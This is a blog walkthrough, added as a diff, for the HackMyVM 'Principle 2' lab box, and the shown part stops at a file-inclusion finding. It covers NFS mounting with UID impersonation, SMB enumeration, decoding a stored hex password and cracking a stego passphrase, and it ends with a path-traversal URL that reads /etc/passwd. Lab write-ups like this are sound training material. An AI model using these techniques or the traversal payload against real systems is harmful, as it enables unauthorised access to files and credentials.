@@ -1,0 +1,377 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="Hack My VM - Principle 2" /><meta property="og:locale" content="en" /><meta name="description" content="HMV Principle 2" /><meta property="og:description" content="HMV Principle 2" /><link rel="canonical" href="https://rubenhortas.github.io/posts/hmv-principle2/" /><meta property="og:url" content="https://rubenhortas.github.io/posts/hmv-principle2/" /><meta property="og:site_name" content="rubenhortas@blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-12-18T01:00:01+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack My VM - Principle 2" /><meta name="twitter:site" content="@rubenhortas" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-07-20T20:43:01+02:00","datePublished":"2023-12-18T01:00:01+01:00","description":"HMV Principle 2","headline":"Hack My VM - Principle 2","mainEntityOfPage":{"@type":"WebPage","@id":"https://rubenhortas.github.io/posts/hmv-principle2/"},"url":"https://rubenhortas.github.io/posts/hmv-principle2/"}</script><title>Hack My VM - Principle 2 | rubenhortas@blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="rubenhortas@blog"><meta name="application-name" content="rubenhortas@blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">rubenhortas@blog</a></div><div class="site-subtitle font-italic">Learning everyday</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="javascript:location.href = 'mailto:' + ['rubenhortas','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/rubenhortas" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/rubenhortas" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/rubenhortas" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack My VM - Principle 2</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack My VM - Principle 2</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1702857601" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 18, 2023 </em> </span> <span> Updated <em class="" data-ts="1721500981" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 20, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/rubenhortas">Rubén Hortas</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2690 words"> <em>14 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/img/posts/hmv-principle2-logo.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle2-logo.png" alt="Principle 2" class="lazyload" data-proofer-ignore></a> <em>HMV Principle 2</em></p><p>I was back to acting last beta tester for my friend <a href="https://kaianperez.github.io">Kaian</a>. I have dedicated the last few days to solve <a href="https://kaianperez.github.io">Kaian</a>’s last machine: <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a> for HackMyVM. I really, admire <strong>A LOT</strong> all the work behind each of one of these boxes. Again, it was a very fun machine and it was a great experience help him, but, this time I have to admit that was a little more complicated. This time it was a medium level machine, and to solve <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a>, I had to learn a few new tricks.</p><p>And, as always, once completed the box, it’s time to write my walkthough.</p><h2 id="annotations"><span class="mr-2">Annotations</span><a href="#annotations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>In this article we are going to assume the following ip addresses:</p><p>Local machine (attacker, local host): 10.0.0.1</p><p>Target machine (victim, <a href="https://hackmyvm.eu/machines/machine.php?vm=Principle2">Principle 2</a> box): 10.0.0.2</p></blockquote><h2 id="warnings"><span class="mr-2">Warnings</span><a href="#warnings" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-warning"><p>Take a snapshot of the machine just after a fresh install. You may need it later.</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Let’s see what services are running:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>nmap -Pn -n -p- -T5 --min-rate 5000 10.0.0.2
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>Nmap scan report for 10.0.0.2
+Host is up (0.00016s latency).
+Not shown: 63482 closed tcp ports (reset), 2043 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+2049/tcp  open  nfs
+33591/tcp open  unknown
+36599/tcp open  unknown
+37023/tcp open  unknown
+47791/tcp open  unknown
+49353/tcp open  unknown
+</pre></table></code></div></div><p>We can see trhee interesting services: web service, rpc and nfs.</p><h3 id="web-service"><span class="mr-2">Web service</span><a href="#web-service" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we browse to the machine, we will find the default apache webpage:</p><p><a href="/assets/img/posts/hmv-principle2-default-apache-web-page.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle2-default-apache-web-page.png" alt="Default apache web page" class="lazyload" data-proofer-ignore></a> <em>Default apache web page</em></p><h3 id="rpcnfs"><span class="mr-2">RPC/NFS</span><a href="#rpcnfs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you find nfs then, probably, you can list and download (maybe upload) files. Let’s take a look:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>$ showmount -e 10.0.0.2
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>Export list for 10.0.0.2:
+/var/backups *
+/home/byron  *
+</pre></table></code></div></div><p>Let’s mount them and see what we find:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ sudo mount -t nfs 10.0.0.2:/var/backups /tmp/backups -o nolock
+$ sudo mount -t nfs 10.0.0.2:/home/byron /tmp/byron -o nolock
+</pre></table></code></div></div><h4 id="homebyron"><span class="mr-2">/home/byron</span><a href="#homebyron" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>$ ls -la /tmp/byron
+...
+lrwxrwxrwx 1 root root      9 Nov 25 12:33 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 1001   1001  220 Apr 23  2023 .bash_logout
+-rw-r--r-- 1 1001   1001 3526 Apr 23  2023 .bashrc
+drwxr-xr-x 3 1001   1001 4096 Nov 23 07:13 .local
+-rw-r--r-- 1 1001   1001  114 Nov 19 18:55 mayor.txt
+-rw-r--r-- 1 1001   1001  219 Nov 23 07:22 memory.txt
+-rw-r--r-- 1 1001   1001  807 Apr 23  2023 .profile
+</pre></table></code></div></div><p>After examining the files, the only interesting files that we found are <code class="language-plaintext highlighter-rouge">mayor.txt</code> and <code class="language-plaintext highlighter-rouge">memory.txt</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat /tmp/byron/mayor.txt
+Now that I am mayor, I think Hermanubis is conspiring against me, I guess he has a secret group and is hiding it.
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">mayor.txt</code> tells us a little about the relation between Byron and Hermanubis:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat /tmp/byron/memory.txt
+Hermanubis told me that he lost his password and couldn't change it, thank goodness I keep a record of each neighbor with their number and password in hexadecimal. I think he would be a good mayor of the New Jerusalem.
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">memory.txt</code> tells us about Hermanubis lost his password, and the most interesting, Byron keeps a record (a backup, maybe?) of each neighbor password encoded in hexadecimal.</p><h4 id="varbackups"><span class="mr-2">/var/backups</span><a href="#varbackups" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s take a look to <code class="language-plaintext highlighter-rouge">/backups</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ ls -la /tmp | grep backups
+drwxr--r-- 2 54 backup 28672 Nov 28 19:00 backups
+</pre></table></code></div></div><p>We can’t read the files inside <code class="language-plaintext highlighter-rouge">/backups</code> because the lack of permissions. But, we can see that the owner of <code class="language-plaintext highlighter-rouge">/backups</code> is the user with UID 54, so we can impersonate that user by creating a new one with this UID:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ sudo useradd -u 54 principle2 -g backup
+$ sudo mkdir /tmp/bkp
+$ sudo chown principle2 -R /tmp/bkp
+$ sudo chmod 755 -R /tmp/bkp
+</pre></table></code></div></div><p>With our new user we can read the files inside <code class="language-plaintext highlighter-rouge">/backups</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ sudo su principle2
+$ ls /tmp/backups
+</pre></table></code></div></div><p>And we see that there are a lot of text files naming with numbers. Filenames seems like a code, doesn’t?</p><h3 id="smb"><span class="mr-2">SMB</span><a href="#smb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now, let’s take a look at smb:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ enum4linux -a 10.0.0.2
+...
+        Sharename       Type      Comment
+        ---------       ----      -------
+        public          Disk      New Jerusalem Public
+        hermanubis      Disk      Hermanubis share
+        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
+...
+//10.0.0.2/public   Mapping: OK Listing: OK Writing: N/A
+//10.0.0.2/hermanubis       Mapping: DENIED Listing: N/A Writing: N/A
+</pre></table></code></div></div><p>We can see that we can read in <code class="language-plaintext highlighter-rouge">/public</code>, and we found the user <code class="language-plaintext highlighter-rouge">hermanubis</code> and we can’t read (or write) in <code class="language-plaintext highlighter-rouge">/hermanubis</code>. Let’s mount them and take a look:</p><h4 id="public"><span class="mr-2">/public</span><a href="#public" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>$ sudo mount -t cifs //10.0.0.2/public /tmp/public
+$ ls -la /tmp/public
+...
+-rwxr-xr-x 1 root root    931 Nov 19 07:01 loyalty.txt
+-rwxr-xr-x 1 root root    158 Nov 19 07:01 new_era.txt
+-rwxr-xr-x 1 root root    718 Nov 19 07:00 straton.txt
+</pre></table></code></div></div><p>We keep finding details of the history between Byron and Hermanubis:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>$ cat /tmp/backups/loyalty.txt
+This text was the source of considerable controversy in a debate between Byron (7) and Hermanubis (452).
+
+What I propose, then, is that we are not born as entirely free agents, responsible only for ourselves. The very core of what we are, our sentience, separates us from and elevates us above the animal kingdom. As I have argued, this is not a matter of arrogance, but of responsibility.
+
+2257686f2061726520796f752c207468656e3f22
+
+To put it simply: each of us owes a burden of loyalty to humanity itself, to the human project across time and space. This is not a minor matter, or some abstract issue for philosophers. It is a profound and significant part of every human life. It is a universal source of meaning and insight that can bind us together and set us on a path for a brighter future; and it is also a division, a line that must held against those who preach the gospel of self-annihilation. We ignore it at our peril.
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">2257686f2061726520796f752c207468656e3f22</code>?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ echo "2257686f2061726520796f752c207468656e3f22" | xxd -p -r
+"Who are you, then?"%
+</pre></table></code></div></div><p>The hexadecimal string doesn’t seem very interesting. What does seem interesting is the <code class="language-plaintext highlighter-rouge">Byron (7) and Hermanubis (452)</code> part. Could this numbers be the “neighbor IDs”?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat /tmp/backups/452.txt
+4279726f6e4973417373686f6c650a0a
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ echo -n 4279726f6e4973417373686f6c650a0a | xxd -p -r
+ByronIsAsshole
+</pre></table></code></div></div><p>It looks like a possible password… And we found a couple more pieces about New Jerusalem history:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat new_era.txt
+Yesterday there was a big change, new government, new mayor. All citizens were reassigned their tasks. For security, every user should change their password.
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ cat straton.txt
+This fragment from Straton's On the Universe appears to have been of great significance both to the Progenitor and to the Founder.
+
+AMYNTAS:        But what does this tell us about the nature of the universe, which is what we were discussing?
+STRATON:        That is the next question we must undertake to answer. We begin with the self because that is what determines our existence as individuals; but the self cannot exist without that which surrounds it. The citizen lives within the city; and the city lives within the cosmos. So now we must apply the principle we have discovered to the wider world, and ask: if man is like a machine, could it be that the universe is similar in nature? And if so, what follows from that fact?
+</pre></table></code></div></div><h4 id="hermanubis"><span class="mr-2">/hermanubis</span><a href="#hermanubis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s mount <code class="language-plaintext highlighter-rouge">/hermanubis</code> now:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sudo mount -t cifs //10.0.0.2/hermanubis /tmp/hermanubis -o username=hermanubis
+</pre></table></code></div></div><p>Asks for a password, let’s try <code class="language-plaintext highlighter-rouge">ByronIsAsshole</code>…</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>$ ls
+...
+  index.html                          N      346  Tue Nov 28 09:44:41 2023
+  prometheus.jpg                      N   307344  Tue Nov 28 12:23:24 2023
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ cat index.html
+...
+    &lt;h1&gt;Welcome to the resistance forum&lt;/h1&gt;
+    &lt;p&gt;free our chains!&lt;/p&gt;
+    &lt;img src="prometheus.jpg" alt="chained"&gt;
+</pre></table></code></div></div><p>The only information we get with <code class="language-plaintext highlighter-rouge">index.html</code> is that Hermanubis is in the resistance. Let’s apply steganographic analysis to <code class="language-plaintext highlighter-rouge">prometheus.jpg</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>$ stegseek prometheus.jpg /usr/share/wordlists/rockyou.txt
+...
+[i] Found passphrase: "soldierofanubis"
+[i] Original filename: "secret.txt".
+[i] Extracting to "prometheus_message.txt".
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ cat prometheus_message.txt
+I have set up a website to dismantle all the lies they tell us about the city: thetruthoftalos.hmv
+</pre></table></code></div></div><h2 id="thetruthoftaloshmv"><span class="mr-2">thetruthoftalos.hmv</span><a href="#thetruthoftaloshmv" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ok, now that we have a new domain, we append it to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ echo "10.0.0.2 thetruthoftalos.hmv" | sudo tee -a /etc/hosts
+10.0.0.2 thetruthoftalos.hmv
+</pre></table></code></div></div><p>If we browse to <code class="language-plaintext highlighter-rouge">thetruthoftalos.hmv</code> we will found nothing (literally):</p><p><a href="/assets/img/posts/hmv-principle2-thetruthoftalos-hmv-index-html.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle2-thetruthoftalos-hmv-index-html.png" alt="thetruthoftalos.hmv index.html" class="lazyload" data-proofer-ignore></a> <em>thetruthoftalos.hmv index.html</em></p><h3 id="directory-enumeration"><span class="mr-2">Directory enumeration</span><a href="#directory-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We will search for resources on our new host:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>$ gobuster dir -u http://thetruthoftalos.hmv --wordlist /usr/share/wordlists/dirb/common.txt -b 403,404 -x php,html,txt
+...
+/index.html           (Status: 200) [Size: 8]
+/index.php            (Status: 200) [Size: 1970]
+/index.php            (Status: 200) [Size: 1970]
+/index.html           (Status: 200) [Size: 8]
+/uploads              (Status: 301) [Size: 169] [--&gt; http://thetruthoftalos.hmv/uploads/]
+</pre></table></code></div></div><h3 id="indexphp"><span class="mr-2">index.php</span><a href="#indexphp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="/assets/img/posts/hmv-principle2-thetruthoftalos-hmv-index-php.png" class="popup img-link "><img data-src="/assets/img/posts/hmv-principle2-thetruthoftalos-hmv-index-php.png" alt="thetruthoftalos.hmv index.php" class="lazyload" data-proofer-ignore></a> <em>thetruthoftalos.hmv index.php</em></p><p>We can type the name of a god and we will see info about it.</p><blockquote class="prompt-info"><p>Talks about twelve gods, but, there are fourteen ;)</p></blockquote><h3 id="path-traversallfi-local-file-inclusion"><span class="mr-2">Path traversal/LFI (Local File Inclusion)</span><a href="#path-traversallfi-local-file-inclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can’t access to <code class="language-plaintext highlighter-rouge">/uploads</code>, but we can load the file of a god by requesting it in the url. If we look at the url that is showed when we insert the name of a god, we will see that maybe vulnerable to path traversal and/or a LFI. After messing around a while with <code class="language-plaintext highlighter-rouge">wfuzz</code> we can found an LFI vulnerability.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://thetruthoftalos.hmv/index.php?filename=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
